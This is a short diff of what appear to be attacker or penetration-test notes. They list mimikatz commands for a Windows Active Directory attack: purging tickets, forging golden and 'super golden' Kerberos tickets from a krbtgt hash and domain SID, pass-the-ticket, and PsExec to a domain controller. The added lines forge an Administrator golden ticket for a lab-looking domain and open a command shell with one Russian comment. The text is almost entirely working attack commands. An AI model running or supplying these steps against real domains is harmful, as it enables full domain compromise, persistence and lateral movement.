@@ -72,6 +72,8 @@ mimikatz # kerberos::purge
 
 mimikatz # kerberos::golden /user:michael /domain:http://corp.com /sid:S-1-5-21-424464709-3473652527-2093888899 /krbtgt:4199649f577fc4f18891600906044e88 /ticket:golden
 
+(kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500)
+
 # Super golden ticket
 kerberos::golden /user:michael /domain:http://corp.com /sid:S-1-5-21-424464709-3473652527-2093888899 /krbtgt:4199649f577fc4f18891600906044e88 /ticket:corp_super_golden /endin:2147483647
 
@@ -81,3 +83,6 @@ mimikatz # kerberos::ptt golden
 
 # PsExec to DC
 PsExec64.exe \\dc01 cmd.exe
+
+# Или запуск cmd для доступа к другим машинам
+mimikatz # misc::cmd
